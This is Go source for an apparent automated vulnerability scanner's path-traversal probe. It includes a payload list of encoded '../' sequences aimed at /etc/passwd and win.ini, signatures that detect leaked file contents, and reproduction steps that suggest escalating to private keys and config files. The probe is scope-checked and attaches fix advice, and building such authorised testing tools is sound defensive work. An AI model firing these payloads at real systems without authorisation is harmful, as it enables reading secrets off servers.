package scanner

import (
	"context"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"

	"auto-bughunter/backend/internal/model"
	"auto-bughunter/backend/internal/scope"
)

// pathTraversalParams are query-parameter names that typically carry a file
// name, path, or resource identifier that the backend may use to construct a
// filesystem or URL path. These are the most common sources of path-traversal
// vulnerabilities.
var pathTraversalParams = []string{
	"file", "path", "page", "document", "doc", "filename",
	"include", "template", "view", "load", "resource", "name",
	"download", "attachment", "img", "image", "src",
}

// pathTraversalPayloads are traversal sequences in roughly increasing
// aggression. We start with the shortest (least likely to be blocked) and
// stop as soon as we find a hit. All payloads are GET-only and deliberately
// target widely-readable system files; no write or execute attempts are made.
//
// Each entry is a (label, payload) pair. The label is recorded in EvidenceFields.
var pathTraversalPayloads = []struct {
	label   string
	payload string
}{
	// Classic Unix — read /etc/passwd to confirm LFI.
	{"unix-classic", "../../../../../../../../etc/passwd"},
	// URL-encoded dot-dot.
	{"unix-url-encoded", "..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd"},
	// Double URL-encoded (survives one decode layer in the WAF/proxy).
	{"unix-double-encoded", "..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd"},
	// Null-byte truncation (still works on some older PHP/C runtimes).
	{"unix-nullbyte", "../../../../etc/passwd%00"},
	// Windows variant (targets IIS / .NET apps on Windows).
	{"windows-classic", `..\..\..\..\..\..\Windows\win.ini`},
	// Windows URL-encoded.
	{"windows-url-encoded", "..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Cwin.ini"},
}

// pathTraversalSignatures are content substrings that strongly confirm a
// successful path traversal / LFI. We look for unique tokens from each target
// file so we can be confident the file was actually read.
var pathTraversalSignatures = []struct {
	label  string
	marker string
}{
	// /etc/passwd — root user always present.
	{"etc-passwd-root", "root:x:0:0:"},
	{"etc-passwd-daemon", "daemon:x:"},
	{"etc-passwd-unix", "root:/bin/"},
	// Windows win.ini — always contains [fonts] and [extensions].
	{"win-ini-fonts", "[fonts]"},
	{"win-ini-extensions", "[extensions]"},
	{"win-ini-files", "[files]"},
}

// pathTraversalMaxAttempts caps the probe budget.
const pathTraversalMaxAttempts = 12

// runActivePathTraversalProbe is an active path-traversal / LFI scanner. It
// injects classic `../` sequences (and URL-encoded/double-encoded variants)
// into common file-path-bearing query parameters and looks for well-known
// filesystem-file content in the response body.
//
// The probe is non-destructive:
//   - Only GET requests are sent.
//   - Only widely-readable system files (/etc/passwd, Windows\win.ini) are
//     targeted — no write or execute operations are attempted.
//   - A finding is emitted only when the actual file content is observed in
//     the response, minimising false positives.
func (s *Service) runActivePathTraversalProbe(ctx context.Context, input RunInput, body string) []model.Finding {
	if input.Options.PassiveOnly {
		return nil
	}

	candidates := extractRuntimeEndpoints(input.Target, body, input.Scope, 8)
	if len(input.Options.SeedRuntimeEndpoints) > 0 {
		candidates = append(candidates, input.Options.SeedRuntimeEndpoints...)
	}
	if len(candidates) == 0 {
		candidates = []string{input.Target}
	}

	if input.Emit != nil {
		input.Emit(model.ScanEvent{
			Type:    model.ScanEventCommand,
			Command: fmt.Sprintf("active-path-traversal %s", input.Target),
			Message: "Probing for path traversal / LFI via dotdot sequences in file-path parameters",
		})
	}

	type hit struct {
		url       string
		param     string
		payload   string
		label     string
		signature string
		header    http.Header
	}

	var hits []hit
	attempts := 0

	for _, raw := range candidates {
		if attempts >= pathTraversalMaxAttempts {
			break
		}
		base, err := url.Parse(strings.TrimSpace(raw))
		if err != nil || base.Scheme == "" || base.Host == "" {
			continue
		}
		for _, p := range pathTraversalParams {
			if attempts >= pathTraversalMaxAttempts {
				break
			}
			for _, pl := range pathTraversalPayloads {
				if attempts >= pathTraversalMaxAttempts {
					break
				}
				probe := *base
				q := probe.Query()
				q.Set(p, pl.payload)
				probe.RawQuery = q.Encode()
				probeURL := probe.String()
				if !scope.IsURLInScope(probeURL, input.Scope) {
					continue
				}
				req, err := http.NewRequestWithContext(ctx, http.MethodGet, probeURL, nil)
				if err != nil {
					continue
				}
				ApplyAuthProfile(req, input.AuthProfile)
				resp, err := s.doRequestWithRetry(ctx, req, input.Options)
				attempts++
				if err != nil || resp == nil {
					continue
				}
				respBody, _ := io.ReadAll(io.LimitReader(resp.Body, 256*1024))
				respHeader := resp.Header
				_ = resp.Body.Close()
				if IsBinaryShape(respHeader) {
					continue
				}

				if sig, matched := matchPathTraversalSignature(string(respBody)); matched {
					hits = append(hits, hit{
						url:       probeURL,
						param:     p,
						payload:   pl.payload,
						label:     pl.label,
						signature: sig,
						header:    respHeader,
					})
					// Found a confirmed hit; stop probing further.
					goto doneProbes
				}
			}
		}
	}
doneProbes:

	if len(hits) == 0 {
		return nil
	}

	first := hits[0]
	urls := make([]string, 0, len(hits))
	for _, h := range hits {
		urls = append(urls, fmt.Sprintf("%s (param=%s, technique=%s)", h.url, h.param, h.label))
	}

	steps := []string{
		fmt.Sprintf("Send GET %s", first.url),
		fmt.Sprintf("The parameter %q contains the traversal sequence %q.", first.param, first.payload),
		fmt.Sprintf("The response body contains %q — confirming the file was read from the server filesystem.", first.signature),
		"Escalate: try reading sensitive application-specific files (config, private keys, application source) using the confirmed traversal depth.",
	}
	curl := buildCurlReproducer(http.MethodGet, first.url, input.AuthProfile, "", "")

	baselines, berr := s.phase1QueryBaselines(ctx, first.url, first.param, "index.html", true, input, 256*1024)
	if berr == nil && phase1BaselineContains(baselines, first.signature) {
		return nil
	}
	diffOutcome := phase1DifferentialQuery(ctx, s, input, "active-path-traversal", first.url, first.param, first.payload, "index.html", 256*1024,
		func(_ context.Context, _ string, _ *http.Response, body []byte) (bool, error) {
			_, matched := matchPathTraversalSignature(string(body))
			return matched, nil
		})
	if diffOutcome.Ran && !diffOutcome.Confirmed {
		return nil
	}

	finding := model.Finding{
		ID:                "active-path-traversal",
		Category:          "input-validation",
		Severity:          model.SeverityHigh,
		Title:             "Path traversal / Local File Inclusion: filesystem content read via dotdot sequences",
		Description:       "A directory-traversal sequence in a file-path parameter caused the server to include and return the contents of a system file. An attacker can exploit this to read arbitrary files accessible to the web-server process, including application secrets, source code, private keys, and OS-level credentials.",
		Evidence:          fmt.Sprintf("Filesystem file content leaked at: %s (first signature: %q)", strings.Join(limitStrings(urls, 6), "; "), first.signature),
		Recommendation:    "Resolve the supplied path to its canonical (real) form before use and verify it is within the intended base directory. Use a safe-path helper (e.g. filepath.Rel in Go, os.path.realpath in Python) and reject any path that escapes the base directory. Prefer serving files by an opaque resource ID mapped server-side rather than reflecting user-supplied paths directly to the filesystem.",
		Confidence:        0.95,
		AffectedURL:       first.url,
		AffectedParameter: first.param,
		CWE:               "CWE-22",
		OWASPCategory:     "A01:2021 - Broken Access Control",
		Sources:           []string{"active-scanner"},
		ReproductionSteps: steps,
		PoC:               curl,
		EvidenceFields: map[string]string{
			"validationType":  "active-probe",
			"technique":       first.label,
			"injectedPayload": first.payload,
			"fileSignature":   first.signature,
			"reproStep":       "Replay the listed URL and confirm system-file content appears in the response body",
			"curlReproducer":  curl,
			"responseShape":   ClassifyResponseShape(first.header).String(),
		},
	}
	AttachDifferentialEvidence(&finding, diffOutcome)
	emitted, ok := phase1SubmitVerified(ctx, finding, "path_traversal", []EvidenceSignal{EvidenceReflection, EvidenceSinkObserved, EvidenceBodyDelta}, "active-path-traversal")
	if !ok {
		return nil
	}
	return []model.Finding{emitted}
}

// matchPathTraversalSignature scans respBody for any known file-content
// marker. Returns (marker, true) on first match or ("", false) if none match.
func matchPathTraversalSignature(body string) (string, bool) {
	for _, sig := range pathTraversalSignatures {
		if strings.Contains(body, sig.marker) {
			return sig.marker, true
		}
	}
	return "", false
}
